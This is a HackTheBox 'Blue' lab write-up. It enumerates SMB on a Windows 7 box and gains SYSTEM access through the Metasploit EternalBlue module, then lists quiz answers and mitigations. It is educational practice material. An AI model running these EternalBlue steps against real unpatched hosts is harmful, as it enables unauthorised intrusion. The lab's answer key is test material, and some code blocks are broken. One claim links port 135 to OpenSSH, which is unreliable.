# HackTheBox - Blue Write-up ðŸ‡¬ðŸ‡§

## Introduction

Hello everyone!

Here is my write-up for the "Blue" box on HackTheBoxâ€”a box classified as easy and focusing on the EternalBlue vulnerability, which has been used in multiple large-scale ransomware and crypto-mining attacks.

As usual, throughout this guide, I will review the common steps of a penetration test:

- Reconnaissance
- Exploitation
- Post-exploitation

## Information

- ðŸ’» **Machine Type**: Windows
- **ðŸ§  Main Skills Tested**: Enumeration, SMB exploitation.
- **ðŸ“¦ Tools Used**: Nmap, smbclient, Metasploit.

This machine is a great opportunity to practice SMB enumeration and exploitation against a Windows host, and to get hands-on with Metasploit.

Let's get started!

---

## Preparation

First, we can add the target IP address to the `/etc/hosts` file to facilitate interaction with the target machine.

```bash
echo "10.129.164.129 target" | sudo tee -a /etc/hosts

```

Or with nano:

```bash
sudo nano /etc/hosts
10.129.164.129 target # Add this line

```

This allows us to access the IP address `10.129.164.129` via the following name: `target`.

**Warning: The target IP address `10.129.164.129` may change during the write-up.**

Let's verify our connection to the HackTheBox VPN with a simple ping to the target machine:

```bash
ping -c 4 target
PING target (10.129.164.129) 56(84) bytes of data.
64 bytes from target (10.129.164.129): icmp_seq=1 ttl=127 time=96.9 ms
64 bytes from target (10.129.164.129): icmp_seq=2 ttl=127 time=119 ms
64 bytes from target (10.129.164.129): icmp_seq=3 ttl=127 time=143 ms
64 bytes from target (10.129.164.129): icmp_seq=4 ttl=127 time=61.6 ms

--- target ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3008ms
	rtt min/avg/max/mdev = 61.639/105.070/142.651/29.847 ms
```

This also allows us to verify that the target machine is accessible from our attacking machine.

Note that this verification will not work if the target machine blocks ICMP requests; in that case, another verification method will be needed.

## Enumeration

As usual, we can start our (active) enumeration by performing our Nmap scan using the aggressive `-A` template to gather as much information as possible during our first scan.

```bash
nmap -A -oN scan.txt -oX scan.xml target
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-18 11:00 CEST

```

Okay, our scan has completed successfully. From this result, we can gather several pieces of information:

- **Port 135**: Port 135 (MSRPC) is open; the machine also seems to be using the OpenSSH service version 8.9p1 â†’ This means that with functional credentials, we can connect via SSH to the target machine.
- **Port 139/445**: Both ports are open and are related to the SMB protocol (older versions were running on port 139); the machine thus seems to have SMB shares available which is very important to know.

â†’ NSE scripts and OS detection indicate that the target is likely a Windows 7 machine.

To clarify things, we can use the script I recently developed: [Nmap2Table](https://github.com/0xMR007/Nmap2Table.git)

```bash
nmap2table scan.xml
Starting main script...

```

We obtain the following result in markdown:

### Q1 - How many open TCP ports are listening on Blue? Don't include any 5-digit ports.

Well, based on the previous table, there are only 3 TCP ports open that donâ€™t have 5 digits.

**Answer :** `3`

### Q2 - What is the hostname of Blue?

Thanks to OS detection and the NSE scripts, we can also answer this question: the hostname is `HARIS-PC`.

**Answer :** `HARIS-PC`

### Q3 - What operating system is running on the target machine? Give a two-word answer with a name and high-level version.

For this question, I tried the first OS guess provided by detection, and it worked.

**Answer :** `Windows 7`

### Q4 - How many SMB shares are available on Blue?

For this question weâ€™re going to use the tool `smbclient` which is used to interact with SMB shares.

Letâ€™s try to list out the shares available on the target machine.

```bash
smbclient -L target -N

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Share           Disk
	Users           Disk
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to target failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

**Command explanation:** We list available SMB shares (`-L`) on `target` without a password (`-N`), since we do not have credentials.

Great! We managed to list the SMB shares. There are `5` shares available.

**Answer :** `5`

### Q5 - What 2017 Microsoft Security Bulletin number describes a remote code execution vulnerability in SMB?

After a bit of research, the relevant Microsoft Security Bulletin is `MS17-010`.

**Answer : `MS17-010`**

### Q6 - Optional question: A worm was set loose on the internet in May 2017 propagating primarily through MS17-010. What is the famous name for that malware?

Similarly, `MS17-010` was exploited by the famous WannaCry ransomware.

**Answer :** `WannaCry`

## Exploitation

### Q7 - What user do you get execution with when exploiting MS17-010? Include the full name, including anything before a .

Good, we now need to exploit the target machine via the **`MS17-010` (EternalBlue)** vulnerability.

To do that we can use _Metasploit_ which is a useful penetration testing framework that includes various modules for each section of a pentest (auxiliary for enum, exploits, post-exploitation, etcâ€¦).

If you are not familiar with Metasploit you can complete Tryhackmeâ€™s module (cf link below) which gives you a complete introduction to it.

[Metasploit module on TryHackMe](https://tryhackme.com/module/metasploit)

Let's start the Metasploit console.

```bash
msfconsole
Metasploit tip: The use command supports fuzzy searching to try and
select the intended module, e.g. use kerberos/get_ticket or use
kerberos forge silver ticket

Perfect! We now have our Metasploit console, letâ€™s search if thereâ€™s any exploit module available for the **MS17-010** vulnerability.

There are many modules available but we need to focus on the EternalBlue one. Thus, letâ€™s use the first one and check its options.

```bash

Great. It seems we only need to set the `RHOSTS` and `LHOST` options, which are respectively the remote target's IP address and our local IP address (the one on your HTB interface).

Letâ€™s set these and run the exploit.

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > set lhost tun0
lhost => 10.10.16.21
msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts target
rhosts => target
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

Amazing! We obtained a Meterpreter session on the target machine. Let's see which user it's running as.

```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

The Meterpreter session is running under the user `NT AUTHORITY\SYSTEM`, which is the most powerful user on a Windows machine. We have full control of the target machine.

**Answer :** `NT AUTHORITY\SYSTEM`

### Flags

Now that we have access to the target machine, we can retrieve the flags and finish the Blue machine.

```bash
meterpreter > pwd
C:\Windows\system32
meterpreter > cd /
meterpreter > cd Users\\haris\\Desktop\\
meterpreter > ls
Listing: C:\Users\haris\Desktop

Congrats! ðŸ¥³ We now have finished the **Blue** machine on HackTheBox!

## Summary

This machine was about exploiting a Windows host vulnerable to the famous **EternalBlue** vulnerability. First, we performed enumeration to identify SMB services and OS details. We then exploited EternalBlue using Metasploit to obtain SYSTEM-level access. Finally, we retrieved the flags and completed the machine!

## What I learned

- How to use Nmap and smbclient to enumerate SMB shares.
- How dangerous the EternalBlue vulnerability is.
- How to use Metasploit to exploit EternalBlue.

## Mitigations

- Update the Windows machines to the latest patches.
- Restrict access to the SMB shares.
- Setup password policies for SMB.
- Use the latest version of SMB.
